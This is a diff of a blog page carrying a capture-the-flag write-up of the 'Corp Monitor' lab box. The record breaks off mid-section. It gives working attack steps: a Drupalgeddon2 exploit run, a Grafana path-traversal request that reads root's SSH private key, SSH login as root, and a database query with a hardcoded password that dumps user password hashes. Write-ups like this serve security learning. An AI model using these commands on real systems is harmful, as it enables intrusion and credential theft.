@@ -1,9 +1,207 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HackINI 2026: Corp Monitor | kanyo's blog</title><meta property="og:title" content="HackINI 2026: Corp Monitor | kanyo's blog"><meta name=twitter:title content="HackINI 2026: Corp Monitor | kanyo's blog"><meta itemprop=name content="HackINI 2026: Corp Monitor | kanyo's blog"><meta name=application-name content="HackINI 2026: Corp Monitor | kanyo's blog"><meta property="og:site_name" content><meta name=description content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><meta itemprop=description content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><meta property="og:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><meta name=twitter:description content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/hackini-corp-monitor/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/hackini-corp-monitor/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HackINI 2026: Corp Monitor"><meta property="og:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-05-26T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-26T00:00:00+00:00"><meta property="article:tag" content="Drupal"><meta property="article:tag" content="Cve-2018-7600"><meta property="article:tag" content="Grafana"><meta property="article:tag" content="Cve-2021-43798"><meta property="article:tag" content="Path-Traversal"><meta property="article:tag" content="Linux"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackINI 2026: Corp Monitor"><meta name=twitter:description content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."><link rel=canonical href=https://chaelsoo.me/writeups/hackini-corp-monitor/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HackINI 2026: Corp Monitor</h1><div class=post-meta><time datetime=2026-05-26T00:00:00+00:00 itemprop=datePublished>26 May 2026</time></div></header><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#grafana-path-traversal>Grafana Path Traversal</a></li><li><a href=#credential-mining>Credential Mining</a></li><li><a href=#summary>Summary</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>A Linux machine running a Drupal intranet CMS with an anonymous FTP server sitting next to it. The FTP turned out to be more of a hint than an attack surface. The real entry was Drupalgeddon2, a 2018 RCE that still shows up everywhere. Once inside, Grafana 8.2.6 was hiding on port 3000, running an unauthenticated path traversal that handed over root&rsquo;s SSH key directly.</p><p><em>Did this one with <a href=https://www.linkedin.com/in/aymen-drid-36bba4243/>Aymen</a>. Always more fun when someone&rsquo;s hunting alongside you and just as locked in. Big shoutout to him.</em></p><h2 id=recon>Recon</h2><p>Three machines in scope, scanned all of them at once:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sV -sC -T4 10.186.15.193 10.186.15.195 10.186.15.196
-</span></span></code></pre></div><p>For <code>.193</code> specifically:</p><pre tabindex=0><code>PORT   STATE SERVICE VERSION
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackINI 2026: Corp Monitor | kanyo&#39;s blog</title>
+<meta property="og:title" content="HackINI 2026: Corp Monitor | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HackINI 2026: Corp Monitor | kanyo&#39;s blog" />
+<meta itemprop="name" content="HackINI 2026: Corp Monitor | kanyo&#39;s blog" />
+<meta name="application-name" content="HackINI 2026: Corp Monitor | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain.">
+<meta itemprop="description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain." />
+<meta property="og:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain." />
+<meta name="twitter:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/hackini-corp-monitor/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/hackini-corp-monitor/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HackINI 2026: Corp Monitor">
+  <meta property="og:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-05-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-26T00:00:00+00:00">
+    <meta property="article:tag" content="Drupal">
+    <meta property="article:tag" content="Cve-2018-7600">
+    <meta property="article:tag" content="Grafana">
+    <meta property="article:tag" content="Cve-2021-43798">
+    <meta property="article:tag" content="Path-Traversal">
+    <meta property="article:tag" content="Linux">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackINI 2026: Corp Monitor">
+  <meta name="twitter:description" content="Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root&#39;s SSH key. Credential harvest from the Drupal DB feeds the rest of the chain.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/hackini-corp-monitor/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackINI 2026: Corp Monitor</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-05-26T00:00:00&#43;00:00" itemprop="datePublished"> 26 May 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#grafana-path-traversal">Grafana Path Traversal</a></li>
+    <li><a href="#credential-mining">Credential Mining</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>A Linux machine running a Drupal intranet CMS with an anonymous FTP server sitting next to it. The FTP turned out to be more of a hint than an attack surface. The real entry was Drupalgeddon2, a 2018 RCE that still shows up everywhere. Once inside, Grafana 8.2.6 was hiding on port 3000, running an unauthenticated path traversal that handed over root&rsquo;s SSH key directly.</p>
+<p><em>Did this one with <a href="https://www.linkedin.com/in/aymen-drid-36bba4243/">Aymen</a>. Always more fun when someone&rsquo;s hunting alongside you and just as locked in. Big shoutout to him.</em></p>
+<h2 id="recon">Recon</h2>
+<p>Three machines in scope, scanned all of them at once:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC -T4 10.186.15.193 10.186.15.195 10.186.15.196
+</span></span></code></pre></div><p>For <code>.193</code> specifically:</p>
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | drwxr-xr-x    2 0        0            4096 May 18 17:18 HR
@@ -13,40 +211,211 @@
 80/tcp open  http    Apache httpd 2.4.52
 |_http-generator: Drupal 7
 |_http-title: CORP Intranet CMS
-</code></pre><p>FTP with anonymous login, SSH, and Drupal 7 on port 80. The folder names <code>HR</code> and <code>IT</code> made it clear this was simulating a real corporate environment. I grabbed everything from FTP in one shot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget -r --no-parent ftp://anonymous:anonymous@10.186.15.193/
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-corp-monitor/backup_hint.png alt="IT/future_tasks.txt from the FTP share showing pending tasks hinting at a monitoring dashboard and backup service"></p><p>The IT department&rsquo;s task list mentioned adding a monitoring dashboard and a backup service for critical databases, which pointed to something worth looking for later.</p><p>On port 80, first thing I always check on a Drupal site is the changelog:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.186.15.193/CHANGELOG.txt <span class=p>|</span> head -50
-</span></span></code></pre></div><pre tabindex=0><code>Drupal 7.57, 2018-02-21
-</code></pre><p>Version 7.57. CVE-2018-7600 was patched in 7.58, so this was wide open. The <code>robots.txt</code> had 36 disallowed entries confirming standard Drupal structure with no custom hardening.</p><h2 id=foothold>Foothold</h2><p>Drupal 7.x before 7.58 doesn&rsquo;t sanitize user-submitted data during the registration process. The <code>#post_render</code>, <code>#pre_render</code>, and <code>#access_callback</code> form API properties can be abused to execute arbitrary PHP. No authentication required.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 drupalgeddon2.py http://10.186.15.193/
-</span></span></code></pre></div><p>Shell landed as <code>www-data</code>.</p><h2 id=grafana-path-traversal>Grafana Path Traversal</h2><p>With a shell as <code>www-data</code>, one of the challenge hints mentioned another service running on the machine. Port scan from inside:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss -tlnp
-</span></span></code></pre></div><p>Port 3000 was listening, bound to localhost: <strong>Grafana 8.2.6</strong>. Not exposed externally, only reachable from the machine itself.</p><p>That version is CVE-2021-43798, unauthenticated arbitrary file read via path traversal in the plugin endpoint. The URL pattern <code>/public/plugins/&lt;plugin-name>/</code> serves static plugin assets but doesn&rsquo;t sanitize the path, so you can traverse out and read any file Grafana can access. Since it was only on localhost, the request had to come from the shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --path-as-is <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=s2>&#34;http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../root/.ssh/id_rsa&#34;</span>
-</span></span></code></pre></div><p>Two things to keep in mind:</p><ul><li><code>--path-as-is</code> tells curl not to normalize the path before sending. Without it, curl collapses the <code>../</code> sequences</li><li>The plugin name has to be a valid installed plugin. <code>alertlist</code> is a Grafana built-in, so it&rsquo;s almost always there</li></ul><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
+</code></pre><p>FTP with anonymous login, SSH, and Drupal 7 on port 80. The folder names <code>HR</code> and <code>IT</code> made it clear this was simulating a real corporate environment. I grabbed everything from FTP in one shot:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget -r --no-parent ftp://anonymous:anonymous@10.186.15.193/
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-corp-monitor/backup_hint.png" alt="IT/future_tasks.txt from the FTP share showing pending tasks hinting at a monitoring dashboard and backup service"></p>
+<p>The IT department&rsquo;s task list mentioned adding a monitoring dashboard and a backup service for critical databases, which pointed to something worth looking for later.</p>
+<p>On port 80, first thing I always check on a Drupal site is the changelog:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.186.15.193/CHANGELOG.txt <span class="p">|</span> head -50
+</span></span></code></pre></div><pre tabindex="0"><code>Drupal 7.57, 2018-02-21
+</code></pre><p>Version 7.57. CVE-2018-7600 was patched in 7.58, so this was wide open. The <code>robots.txt</code> had 36 disallowed entries confirming standard Drupal structure with no custom hardening.</p>
+<h2 id="foothold">Foothold</h2>
+<p>Drupal 7.x before 7.58 doesn&rsquo;t sanitize user-submitted data during the registration process. The <code>#post_render</code>, <code>#pre_render</code>, and <code>#access_callback</code> form API properties can be abused to execute arbitrary PHP. No authentication required.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 drupalgeddon2.py http://10.186.15.193/
+</span></span></code></pre></div><p>Shell landed as <code>www-data</code>.</p>
+<h2 id="grafana-path-traversal">Grafana Path Traversal</h2>
+<p>With a shell as <code>www-data</code>, one of the challenge hints mentioned another service running on the machine. Port scan from inside:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -tlnp
+</span></span></code></pre></div><p>Port 3000 was listening, bound to localhost: <strong>Grafana 8.2.6</strong>. Not exposed externally, only reachable from the machine itself.</p>
+<p>That version is CVE-2021-43798, unauthenticated arbitrary file read via path traversal in the plugin endpoint. The URL pattern <code>/public/plugins/&lt;plugin-name&gt;/</code> serves static plugin assets but doesn&rsquo;t sanitize the path, so you can traverse out and read any file Grafana can access. Since it was only on localhost, the request had to come from the shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --path-as-is <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../root/.ssh/id_rsa&#34;</span>
+</span></span></code></pre></div><p>Two things to keep in mind:</p>
+<ul>
+<li><code>--path-as-is</code> tells curl not to normalize the path before sending. Without it, curl collapses the <code>../</code> sequences</li>
+<li>The plugin name has to be a valid installed plugin. <code>alertlist</code> is a Grafana built-in, so it&rsquo;s almost always there</li>
+</ul>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gt
 ...
 -----END OPENSSH PRIVATE KEY-----
-</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod <span class=m>600</span> root_id_rsa
-</span></span><span class=line><span class=cl>ssh -i root_id_rsa root@10.186.15.193
-</span></span></code></pre></div><p>Root on corp-monitor.</p><h2 id=credential-mining>Credential Mining</h2><p>With root access I went after the Drupal database. The backup hint from FTP led me to <code>backup.sh</code>:</p><p><img src=/images/writeups/hackini-corp-monitor/backup_script.png alt="backup.sh showing mysqldump command with hardcoded root MySQL credentials"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>drupaluser</span><span class=w> </span><span class=o>-</span><span class=n>p</span><span class=s1>&#39;fMlG4DK3TGfz208X&#39;</span><span class=w> </span><span class=n>drupaldb</span><span class=w> </span><span class=err>\</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=o>-</span><span class=n>e</span><span class=w> </span><span class=s2>&#34;SELECT name,pass FROM users;&#34;</span><span class=w>
-</span></span></span></code></pre></div><p>Full user table: Drupal password hashes (<code>$S$D...</code> format, SHA-512 with salt) for every user on the platform:</p><pre tabindex=0><code>admin       $S$DyGe0aGEWc1QvH9XZFHf8I2rfNlP...
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> root_id_rsa
+</span></span><span class="line"><span class="cl">ssh -i root_id_rsa root@10.186.15.193
+</span></span></code></pre></div><p>Root on corp-monitor.</p>
+<h2 id="credential-mining">Credential Mining</h2>
+<p>With root access I went after the Drupal database. The backup hint from FTP led me to <code>backup.sh</code>:</p>
+<p><img src="/images/writeups/hackini-corp-monitor/backup_script.png" alt="backup.sh showing mysqldump command with hardcoded root MySQL credentials"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">drupaluser</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="s1">&#39;fMlG4DK3TGfz208X&#39;</span><span class="w"> </span><span class="n">drupaldb</span><span class="w"> </span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&#34;SELECT name,pass FROM users;&#34;</span><span class="w">
+</span></span></span></code></pre></div><p>Full user table: Drupal password hashes (<code>$S$D...</code> format, SHA-512 with salt) for every user on the platform:</p>
+<pre tabindex="0"><code>admin       $S$DyGe0aGEWc1QvH9XZFHf8I2rfNlP...
 h.dhayaa    $S$DBkiUk25FO/FRoBkEtrRFhQas8iuDn1...
